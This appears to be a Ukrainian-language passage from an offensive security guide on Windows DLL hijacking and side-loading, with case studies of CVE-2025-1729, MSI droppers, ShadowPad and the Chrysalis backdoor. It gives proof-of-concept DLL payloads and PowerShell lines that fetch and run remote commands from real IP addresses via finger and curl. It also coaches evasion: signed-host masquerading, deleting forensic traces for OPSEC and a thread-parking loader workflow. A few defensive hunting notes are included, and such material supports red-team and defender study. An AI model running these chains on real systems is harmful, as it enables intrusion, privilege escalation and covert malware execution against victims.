Bring Your Own Accessibility (BYOA)
- Ви можете клонувати запис в реєстрі вбудованого Accessibility Tool (AT) (наприклад, CursorIndicator), змінити його так, щоб він вказував на довільний binary/DLL, імпортувати його, а потім встановити `configuration` у назву цього AT. Це забезпечує proxy для довільного виконання в межах Accessibility framework.

Notes
- Запис у `%windir%\System32` і зміна значень HKLM потребують прав адміністратора.
- Уся логіка payload може міститися в `DLL_PROCESS_ATTACH`; exports не потрібні.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Цей приклад демонструє **Phantom DLL Hijacking** у Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), зареєстрований як **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Vulnerability Details

- **Component**: `TPQMAssistant.exe`, розташований у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` запускається щодня о 9:30 під контекстом користувача, який увійшов у систему.
- **Directory Permissions**: Доступний для запису `CREATOR OWNER`, що дозволяє локальним користувачам розміщувати довільні файли.
- **DLL Search Behavior**: Спочатку намагається завантажити `hostfxr.dll` зі своєї робочої директорії та записує "NAME NOT FOUND", якщо файл відсутній, що вказує на пріоритет пошуку в локальній директорії.

### Exploit Implementation

Зловмисник може розмістити шкідливий stub `hostfxr.dll` у тій самій директорії, скориставшись відсутністю DLL для досягнення виконання коду в контексті користувача:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Послідовність атаки

1. Як стандартний користувач, помістіть `hostfxr.dll` у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Дочекайтеся запуску запланованого завдання о 9:30 під контекстом поточного користувача.
3. Якщо під час виконання завдання увійшов адміністратор, шкідлива DLL запуститься в сесії адміністратора із середнім рівнем цілісності.
4. Застосуйте стандартні техніки обходу UAC, щоб підвищити рівень доступу від середнього рівня цілісності до привілеїв SYSTEM.

## Практичний приклад: MSI CustomAction Dropper + DLL Side-Loading через підписаний Host (wsc_proxy.exe)

Зловмисники часто поєднують droppers на основі MSI з DLL side-loading, щоб запускати payload у довіреному підписаному процесі.<sup>[[10]](#references)</sup>

Огляд ланцюжка
- Користувач завантажує MSI. Під час встановлення через GUI CustomAction непомітно запускається (наприклад, LaunchApplication або дія VBScript), відновлюючи наступний етап із вбудованих ресурсів.
- Dropper записує легітимний підписаний EXE і шкідливу DLL в один каталог (приклад пари: підписаний Avast wsc_proxy.exe + контрольований зловмисником wsc.dll).
- Коли підписаний EXE запускається, порядок пошуку DLL у Windows спочатку завантажує wsc.dll із робочого каталогу, виконуючи код зловмисника в підписаному батьківському процесі (ATT&CK T1574.001).

Аналіз MSI (що шукати)
- Таблиця CustomAction:
- Шукайте записи, які запускають виконувані файли або VBScript. Приклад підозрілої структури: LaunchApplication, що запускає вбудований файл у фоновому режимі.
- В Orca (Microsoft Orca.exe) перевірте таблиці CustomAction, InstallExecuteSequence і Binary.
- Вбудовані/розділені payload у MSI CAB:
- Адміністративне розпакування: msiexec /a package.msi /qb TARGETDIR=C:\out
- Або використайте lessmsi: lessmsi x package.msi C:\out
- Шукайте кілька невеликих фрагментів, які об’єднуються та розшифровуються CustomAction на VBScript. Типовий процес:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Практичний sideloading із wsc_proxy.exe
- Помістіть ці два файли в одну папку:
- wsc_proxy.exe: легітимний підписаний host (Avast). Процес намагається завантажити wsc.dll за іменем із власного каталогу.
- wsc.dll: DLL атакера. Якщо конкретні exports не потрібні, достатньо DllMain; інакше створіть proxy DLL і перенаправте необхідні exports до справжньої бібліотеки, виконуючи payload у DllMain.
- Створіть мінімальний DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Для вимог щодо export використовуйте proxying framework (наприклад, DLLirant/Spartacus), щоб згенерувати forwarding DLL, яка також виконує ваш payload.

- Ця техніка покладається на визначення імені DLL host binary. Якщо host використовує абсолютні шляхи або safe loading flags (наприклад, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack може не спрацювати.
- KnownDLLs, SxS і forwarded exports можуть впливати на пріоритет і мають враховуватися під час вибору host binary та набору exports.

## Підписані triads + зашифровані payloads (case study ShadowPad)

Check Point описала, як Ink Dragon розгортає ShadowPad за допомогою **triad із трьох файлів**, щоб маскуватися під легітимне ПЗ і водночас зберігати основний payload зашифрованим на диску:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – зловживають файлами таких vendors, як AMD, Realtek або NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Attackers перейменовують executable так, щоб він виглядав як Windows binary (наприклад, `conhost.exe`), але Authenticode signature залишається дійсним.
2. **Malicious loader DLL** – розміщується поруч із EXE під очікуваним іменем (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL зазвичай є MFC binary, obfuscated за допомогою framework ScatterBrain; її єдине завдання – знайти encrypted blob, розшифрувати його та reflectively map ShadowPad.
3. **Encrypted payload blob** – часто зберігається як `<name>.tmp` у тому самому каталозі. Після memory-mapping розшифрованого payload loader видаляє TMP file, щоб знищити forensic evidence.

Нотатки щодо tradecraft:

* Перейменування signed EXE (із збереженням оригінального `OriginalFileName` у PE header) дає змогу видати його за Windows binary, зберігши vendor signature, тому відтворюйте звичку Ink Dragon розміщувати binaries, схожі на `conhost.exe`, які насправді є utilities від AMD/NVIDIA.
* Оскільки executable залишається trusted, більшості allowlisting controls достатньо, щоб ваш malicious DLL знаходився поруч із ним. Зосередьтеся на налаштуванні loader DLL; signed parent зазвичай може запускатися без змін.
* Decryptor ShadowPad очікує, що TMP blob знаходиться поруч із loader і доступний для запису, щоб після mapping він міг занулити файл. Залишайте каталог доступним для запису до завантаження payload; після його розміщення в memory TMP file можна безпечно видалити для OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators поєднують DLL sideloading із LOLBAS, завдяки чому єдиним custom artifact на диску залишається malicious DLL поруч із trusted EXE:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Hidden PowerShell запускає `cmd.exe /c`, отримує команди з Finger server і передає їх до `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` отримує текст через TCP/79; `| cmd` виконує відповідь сервера, даючи operators змогу змінювати second stage на server-side.

- **Built-in download/extract:** Завантажте archive з benign extension, розпакуйте його та розмістіть sideload target разом із DLL у випадковому каталозі `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` приховує progress і переходить за redirects; `tar -xf` використовує вбудований у Windows tar.

- **WMI/CIM launch:** Запустіть EXE через WMI, щоб у telemetry відображався process, створений через CIM, під час завантаження colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Працює з binaries, які надають перевагу local DLL (наприклад, `intelbq.exe`, `nearby_share.exe`); payload (наприклад, Remcos) запускається під trusted name.

- **Hunting:** Створюйте alert на `forfiles`, коли `/p`, `/m` і `/c` з’являються разом; поза admin scripts це трапляється нечасто.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Під час нещодавнього intrusion Lotus Blossom зловживала trusted update chain, щоб доставити NSIS-packed dropper, який розміщував DLL sideload і повністю in-memory payloads.<sup>[[13]](#references)</sup>

Потік tradecraft
- `update.exe` (NSIS) створює `%AppData%\Bluetooth`, позначає його як **HIDDEN**, розміщує перейменований Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll` і encrypted blob `BluetoothService`, після чого запускає EXE.
- Host EXE імпортує `log.dll` і викликає `LogInit`/`LogWrite`. `LogInit` завантажує blob через mmap; `LogWrite` розшифровує його за допомогою custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material, отриманий із попереднього hash), перезаписує buffer plaintext shellcode, звільняє тимчасові дані та переходить до нього.
- Щоб уникнути IAT, loader визначає APIs шляхом hashing export names із використанням **FNV-1a basis 0x811C9DC5 + prime 0x100019**, після чого застосовує Murmur-style avalanche (**0x85EBCA6B**) і порівнює результати із salted target hashes.

Основний shellcode (Chrysalis)
- Розшифровує PE-like main module шляхом повторення операцій add/XOR/sub із key `gQ2JR&9;` протягом п’яти проходів, після чого динамічно завантажує `Kernel32.dll` → `GetProcAddress` для завершення import resolution.
- Відновлює рядки імен DLL під час runtime за допомогою per-character bit-rotate/XOR transforms, після чого завантажує `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Використовує другий resolver, який проходить **PEB → InMemoryOrderModuleList**, аналізує кожну export table блоками по 4 bytes із Murmur-style mixing і переходить до `GetProcAddress`, лише якщо hash не знайдено.

Embedded configuration & C2
- Config знаходиться всередині dropped `BluetoothService` file за **offset 0x30808** (size **0x980**) і розшифровується через RC4 із key `qwhvb^435h&*7`, revealing C2 URL і User-Agent.
- Beacons формують dot-delimited host profile, додають на початок tag `4Q`, потім шифрують через RC4 із key `vAuig34%^325hGV` перед `HttpSendRequestA` через HTTPS. Responses розшифровуються RC4 і передаються через tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode визначається CLI args: без args = install persistence (service/Run key), що вказує на `-i`; `-i` повторно запускає self із `-k`; `-k` пропускає install і запускає payload.

Альтернативний loader
- Під час того самого intrusion було розміщено Tiny C Compiler і виконано `svchost.exe -nostdlib -run conf.c` із `C:\ProgramData\USOShared\`, а поруч із ним знаходився `libtcc.dll`. C source, наданий attacker, містив shellcode, компілювався та запускався in-memory без запису PE на диск. Відтворіть це за допомогою:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Цей етап компіляції та запуску на основі TCC імпортував `Wininet.dll` під час виконання та завантажував shellcode другого етапу з URL, жорстко заданого в коді, забезпечуючи гнучкий loader, який маскується під запуск компілятора.

## Signed-host sideloading with export proxying + host thread parking

Деякі ланцюжки DLL sideloading додають **стабілізацію**, щоб легітимний host залишався активним достатньо довго для коректного завантаження наступних етапів, замість аварійного завершення після завантаження malicious DLL.<sup>[[11]](#references)</sup>

Observed pattern
- Розмістити trusted EXE поруч із malicious DLL, використовуючи очікуване ім'я dependency, наприклад `version.dll`.
- Malicious DLL **проксіює кожен очікуваний export** до справжньої системної DLL (наприклад `%SystemRoot%\\System32\\version.dll`), щоб resolution імпортів продовжував успішно виконуватися, а host process залишався працездатним.
- Після завантаження malicious DLL **патчить entry point host**, щоб main thread переходив у нескінченний цикл `Sleep`, а не завершував роботу або не виконував code paths, які завершили б process.
- Новий thread виконує справжню malicious-роботу: розшифровує ім'я або шлях DLL наступного етапу (часто використовуються RC4/XOR), а потім запускає її через `LoadLibrary`.

Why this matters
- Звичайне DLL proxying зберігає API compatibility, але не гарантує, що host залишатиметься активним достатньо довго для наступних етапів.
- Призупинення main thread у `Sleep(INFINITE)` — простий спосіб утримувати signed process у пам'яті, поки loader виконує розшифрування, staging або network bootstrap у worker thread.
- Пошук лише підозрілого `DllMain` може пропустити цей pattern, якщо цікава поведінка відбувається після patching entry point host і запуску secondary thread.

Minimal workflow
1. Скопіювати signed host EXE та визначити DLL, яку він resolution-ить із локальної директорії.
2. Створити proxy DLL, яка експортує ті самі functions і перенаправляє їх до легітимної DLL.
3. У `DllMain(DLL_PROCESS_ATTACH)` створити worker thread.
4. Із цього thread пропатчити entry point host або main thread start routine, щоб він зациклювався на `Sleep`.
5. Розшифрувати ім'я/config DLL наступного етапу та викликати `LoadLibrary` або виконати manual-map payload.

Defensive pivots
- Signed processes, які завантажують `version.dll` або подібні common libraries із власної application directory замість `System32`.
- Memory patches у process entry point невдовзі після image load, особливо jumps/calls, перенаправлені до `Sleep`/`SleepEx`.
- Threads, створені proxy DLL, які одразу викликають `LoadLibrary` для другої DLL із розшифрованим ім'ям.
- Full-export proxy DLL, розміщені поруч із vendor executables у writable staging directories, таких як `ProgramData`, `%TEMP%` або шляхи з розпакованими архівами.

## References

- [1] [Red Canary – Розвідувальні висновки: січень 2026 року](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Підвищення привілеїв за допомогою TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking у Windows. Простий приклад на C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore розгортає нове malware, націлене на Європу](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: коли DLL Hijacks зустрічаються з Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Цифрові двійники: анатомія кампаній із вдосконаленням impersonation, що поширюють Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Конвергенція інтересів: аналіз threat clusters, націлених на уряд держави Південно-Східної Азії](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Всередині Ink Dragon: розкриття relay network і внутрішньої роботи stealthy offensive operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Backdoor Chrysalis: детальний аналіз toolkit Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Відстеження espionage campaigns іранського APT Screening Serpens у 2026 році](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – елемент `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – елемент `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – елемент `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – елемент `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – елемент `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – елемент `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: операції Nimbus Manticore під час іранського конфлікту](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 націлюється на уряди та критичну інфраструктуру держав Південно-Східної Азії](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
